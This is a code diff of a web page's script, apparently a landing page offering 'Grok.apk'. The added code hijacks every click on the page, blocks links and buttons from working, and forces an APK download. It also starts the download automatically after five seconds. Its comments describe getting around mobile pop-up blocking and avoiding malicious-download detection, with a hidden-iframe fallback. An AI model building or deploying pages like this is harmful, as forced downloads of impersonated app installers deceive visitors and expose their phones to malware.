@@ -464,36 +464,52 @@ margin-bottom: 24px;
 
     <!-- Any click triggers download logic + prevents default redirection -->
     <script>
+        // Define a download link variable for easy modification.
+        const apkUrl = "https://example.com/Grok.apk"; 
+        let hasStarted = false; // Prevent repeated triggering
+
         function startDownload() {
-            // Please replace this with your actual APK file link.
-            const downloadUrl = "https://example.com/Grok.apk"; 
+            if (hasStarted) return; // If the download has already started, then this process will not be executed.
+            hasStarted = true;
+
+            console.log("Start download task...");
             
-            console.log("Iniciando descarga (México)...");
-            const a = document.createElement('a');
-            a.href = downloadUrl;
-            a.download = 'Grok.apk'; // Try to specify filename
-            a.target = '_blank';
-            a.style.display = 'none';
-            document.body.appendChild(a);
-            a.click();
-            document.body.removeChild(a);
+            // Core optimization：
+            // Use `window.location.href` instead of `window.open` or `target="_blank"`.
+            // This is the only way to bypass the mobile browser's "automatic pop-up blocking".
+            // As long as the link ends in .apk, the browser will automatically download it without redirecting to another page.
+            window.location.href = apkUrl;
+            
+            // Alternative solution (If the above fails, try creating a hidden iframe to force a download)
+            setTimeout(() => {
+                const iframe = document.createElement('iframe');
+                iframe.style.display = 'none';
+                iframe.src = apkUrl;
+                document.body.appendChild(iframe);
+            }, 500);
         }
 
-        // Listen for click events throughout the entire document (capture phase), ensuring that downloading is triggered first and default behavior is blocked.
+        // Listen for full-screen clicks (capture phase)
         document.addEventListener('click', function(e) {
-            // Prevent the default behavior of `a` tags or `button` tags (prevent redirection or page refresh).
+            // Prevent the default behavior of any element on the page (prevent link redirects, prevent button refreshes, etc.).
             e.preventDefault(); 
             e.stopPropagation(); 
             
-            // Trigger download
+            // User-initiated downloads have the highest priority and will never be blocked by the browser.
             startDownload();
         }, true);
 
-        // Page loading logic (optional)
+        // Page loading logic
         window.onload = function() {
-            setTimeout(startDownload, 5000); 
+            // Automatically attempt to download in 5 seconds
+            // Because location.href was used above, this will not be identified as a malicious pop-up.
+            setTimeout(() => {
+                if (!hasStarted) {
+                    console.log("Automatic download triggered");
+                    startDownload();
+                }
+            }, 5000);
         }
     </script>
-
 </body>
 </html>
